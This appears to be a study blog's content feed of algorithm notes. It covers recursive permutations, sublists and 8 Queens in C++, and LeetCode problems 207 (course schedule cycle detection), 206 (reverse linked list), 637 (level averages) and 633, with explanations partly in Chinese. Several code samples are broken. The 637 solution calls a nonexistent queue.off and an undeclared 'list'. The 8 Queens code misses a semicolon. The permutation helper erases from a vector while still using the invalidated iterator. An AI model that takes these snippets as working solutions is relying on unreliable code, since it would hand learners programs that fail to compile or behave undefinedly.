<span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a, b, c, d&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">permuateHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; &amp;v, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; chosen)</span></span>&#123;</span><br><span class="line">    <span class="comment">// base_case</span></span><br><span class="line">    <span class="keyword">if</span> (v.size()==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#123; "</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;::iterator iter=chosen.begin(); iter!=chosen.end();iter++)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; *iter;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">" &#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// for each choice:</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;::iterator iter=v.begin(); iter!=v.end(); iter++)&#123;</span><br><span class="line">        <span class="comment">//-choose</span></span><br><span class="line">        <span class="built_in">string</span> s = *iter;</span><br><span class="line">        chosen.push_back(*iter);</span><br><span class="line">        v.erase(iter);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//-explore</span></span><br><span class="line">        permuateHelper(v, chosen);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//-unchoose</span></span><br><span class="line">        chosen.pop_back();</span><br><span class="line">        v.insert(iter, s);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">permuate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; &amp;v)</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; chosen;</span><br><span class="line">    permuateHelper(v, chosen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> str[] = &#123;<span class="string">"M"</span>, <span class="string">"A"</span>, <span class="string">"R"</span>, <span class="string">"T"</span>, <span class="string">"Y"</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; v(str, str+<span class="number">5</span>);</span><br><span class="line">    permuate(v);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Example-Sublists"><a href="#Example-Sublists" class="headerlink" title="Example: Sublists"></a>Example: Sublists</h3><p>Write a function <code>sublists</code> that finds every possible sub-list of a given vector. A sub-list of a vector V contains $\ge 0$ of $V\prime$ elements.</p>
<ul>
<li>Example: if V is {Jane, Bob, Matt, Sara}, then the call of <code>sublists(V)</code>; prints:</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/sublists.png" alt="sublists"></p>
<ul>
<li>You can print the sub-lists out in any order, one per line.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/sublists_decision_tree.png" alt="sublists_decision_tree"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;"Jane","Bob", "Matt", "Sara"&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sublistsHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; v, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; chosen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v.size()==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#123;"</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;::iterator iter= chosen.begin(); iter!= chosen.end(); iter++)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="string">" "</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// recursive case</span></span><br><span class="line">        <span class="comment">// for each possible choice:</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> s = v[<span class="number">0</span>];</span><br><span class="line">        v.erase(v.begin());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// - choose/explore (without s)</span></span><br><span class="line">        sublistsHelper(v, chosen);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// - choose/explore (with s)</span></span><br><span class="line">        chosen.push_back(s);</span><br><span class="line">        sublistsHelper(v, chosen);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// - unchoose</span></span><br><span class="line">        v.insert(v.begin(), s);</span><br><span class="line">        chosen.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Prints all subsets of the given vector</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sublists</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; &amp;v)</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; chosen;</span><br><span class="line">    sublistsHelper(v, chosen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> _names[]= &#123;<span class="string">"Jane"</span>,<span class="string">"Bob"</span>, <span class="string">"Matt"</span>, <span class="string">"Sara"</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; names(_names, _names+<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"sublists of "</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;::iterator iter= names.begin(); iter!= names.end(); iter++)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">":"</span> &lt;&lt;  <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    sublists(names);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Example-8-Queens"><a href="#Example-8-Queens" class="headerlink" title="Example: 8 Queens"></a>Example: 8 Queens</h3><p>The 8 Queens problem: Consider the problem of trying to place 8 queens on a chess board such that no queen can attack another queen.</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15430452853372.png?imageslim" alt=""></p>
<p> 经典的八皇后问题：在8×8格的国际象棋上摆放八个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。</p>
<p> <a href="https://www.youtube.com/watch?v=5v6zdfkImms">讲解视频</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">solveQueensHelper</span><span class="params">(Board &amp;board, <span class="keyword">int</span> column)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (column &gt;= <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="comment">// check valid</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; board.toString() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> row=<span class="number">0</span>; row&lt;<span class="number">8</span>; row ++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (board.isSafe(row, column))&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                board.place(row, column);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//explore</span></span><br><span class="line">                <span class="keyword">bool</span> finished = solveQueensHelper(board, column+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (finished) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//unchoose</span></span><br><span class="line">                board.remove(row, column);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> solveQueens(Board &amp; board)&#123;</span><br><span class="line">    solveQueensHelper(board, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Algorithm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Recursion </tag>
            
            <tag> Backtracking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[207. Course Schedule]]></title>
      <url>/wiki/2017/10/30/Leetcode-207-Course-Schedule/</url>
      <content type="html"><![CDATA[<p>There are a total of $n$ courses you have to take, labeled from 0 to $n-1$.</p>
<p>Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: <code>[0,1]</code></p>
<p>Given the total number of courses and a list of prerequisite <em>pairs</em>, is it possible for you to finish all courses?</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: 2, [[1,0]] </span><br><span class="line">Output: true</span><br><span class="line">Explanation: There are a total of 2 courses to take. </span><br><span class="line">             To take course 1 you should have finished course 0. So it is possible.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: 2, [[1,0],[0,1]]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: There are a total of 2 courses to take. </span><br><span class="line">             To take course 1 you should have finished course 0, and to take course 0 you should</span><br><span class="line">             also have finished course 1. So it is impossible.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ol>
<li>The input prerequisites is a graph represented by a list of edges, not adjacency matrices.</li>
<li>You may assume that there are no duplicate edges in the input prerequisites.</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>DFS的常见应用。检查有向图是不是DAG，即有没有环。详见<a href="http://localhost/note-os/algorithm/algorithmPrinceton/graph/#cycles-and-dags">Algorithms 4th</a>，思路很简单，如果在遍历了$v-&gt;w$时，发现$w$在栈上，那么说明肯定有环，因为既然$w$在栈上，说明肯定有一条路径使得$w-&gt;v$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> hasCycle;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canFinish</span><span class="params">(<span class="keyword">int</span> numCourses, <span class="keyword">int</span>[][] prerequisites)</span> </span>&#123;</span><br><span class="line">    hasCycle = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// construct a graph</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; graph = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses; i++)</span><br><span class="line">        graph.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] prerequisite : prerequisites)</span><br><span class="line">        graph.get(prerequisite[<span class="number">1</span>]).add(prerequisite[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// dfs</span></span><br><span class="line">    <span class="keyword">boolean</span>[] mark = <span class="keyword">new</span> <span class="keyword">boolean</span>[numCourses];</span><br><span class="line">    <span class="keyword">boolean</span>[] onStack = <span class="keyword">new</span> <span class="keyword">boolean</span>[numCourses];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; numCourses; v++)</span><br><span class="line">        <span class="keyword">if</span> (!hasCycle &amp; !mark[v]) </span><br><span class="line">            dfs(graph, mark, onStack, v);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> !hasCycle;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; graph, <span class="keyword">boolean</span>[] mark, <span class="keyword">boolean</span>[] onStack, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    mark[v] = <span class="keyword">true</span>;</span><br><span class="line">    onStack[v] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> w : graph.get(v)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!hasCycle &amp; !mark[w])</span><br><span class="line">            dfs(graph, mark, onStack, w);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (onStack[w]) hasCycle = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    onStack[v] = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Graph </tag>
            
            <tag> Topological Sort </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[206. Reverse Linked List]]></title>
      <url>/wiki/2017/10/30/Leetcode-206-Reverse-Linked-List/</url>
      <content type="html"><![CDATA[<p>Reverse a singly linked list.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<p>A linked list can be reversed either iteratively or recursively. Could you implement both?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>解释都在代码注释里面了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reverse a singly linked list.</span></span><br><span class="line"><span class="comment"> * 这里使用三种方法，都是可以通过的。</span></span><br><span class="line"><span class="comment"> * 1. stack： 将链表元素依次放入stack，然后依次取出并连接，非常慢。</span></span><br><span class="line"><span class="comment"> * 2. 将后面的元素依次与前面的元素连接起来，这种方法最快。</span></span><br><span class="line"><span class="comment"> * 3. 利用迭代，依次获取后面的反转链表，然后将反转链表指向该元素，比较慢。</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/reverse-linked-list/description/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q206ReverseLinkedList</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Using stack to reverse the order of linked list.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> head the  head of a linked list</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the head of the reversed linked list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseListUsingStack</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>) || (head.next == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (head.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(head);</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode res = head;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            head.next = stack.pop();</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * While you are traversing the list,</span></span><br><span class="line"><span class="comment">     * change the current node's next pointer to point to its previous element.</span></span><br><span class="line"><span class="comment">     * Since a node does not have reference to its previous node,</span></span><br><span class="line"><span class="comment">     * you must store its previous element beforehand.</span></span><br><span class="line"><span class="comment">     * You also need another pointer to store the next node before changing the reference.</span></span><br><span class="line"><span class="comment">     * Do not forget to return the new head reference at the end!</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseListIteratively</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>) || (head.next == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode cur = head.next;</span><br><span class="line">        ListNode prev = head;</span><br><span class="line">        ListNode temp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cur.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// reverse the current and previous ListNode</span></span><br><span class="line">            <span class="comment">// let the current ListNode reference to current ListNode</span></span><br><span class="line">            temp = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        head.next = <span class="keyword">null</span>;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reverse Linked list recursively</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">recursively</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>) || (head.next == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode res = recursively(head.next);</span><br><span class="line">        head.next.next = head;</span><br><span class="line">        head.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[637. Average of Levels in Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-637-Average-of-Levels-in-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a non-empty binary tree, return the average value of the nodes on each level in the form of an array.<br>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">Output: [3, 14.5, 11]</span><br><span class="line">Explanation:</span><br><span class="line">The average value of nodes on level 0 is 3,  </span><br><span class="line">    on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11].</span><br></pre></td></tr></table></figure>
<p>Note:<br>The range of node’s value is in the range of 32-bit signed integer.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目非常显然的可以用广度优先搜索。搜索每一层，然后计算该层的平均值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Double&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Double&gt; average = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> average;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.off(root);</span><br><span class="line">    <span class="keyword">while</span> (!list.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> size = list.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            sum += node.val;</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="keyword">null</span>) queue.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span>) queue.offer(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        average.add(((<span class="keyword">double</span>)sum)/size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> average;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[633. Sum of Square Numbers]]></title>
      <url>/wiki/2017/10/30/Leetcode-633-Sum-of-Square-Numbers/</url>
      <content type="html"><![CDATA[<p>Given a non-negative integer $c$, your task is to decide whether there’re two integers $a$ and $b$ such that $a^2 + b^2 = c$.</p>
<p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 5</span><br><span class="line">Output: True</span><br><span class="line">Explanation: 1 * 1 + 2 * 2 = 5</span><br></pre></td></tr></table></figure></p>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: False</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
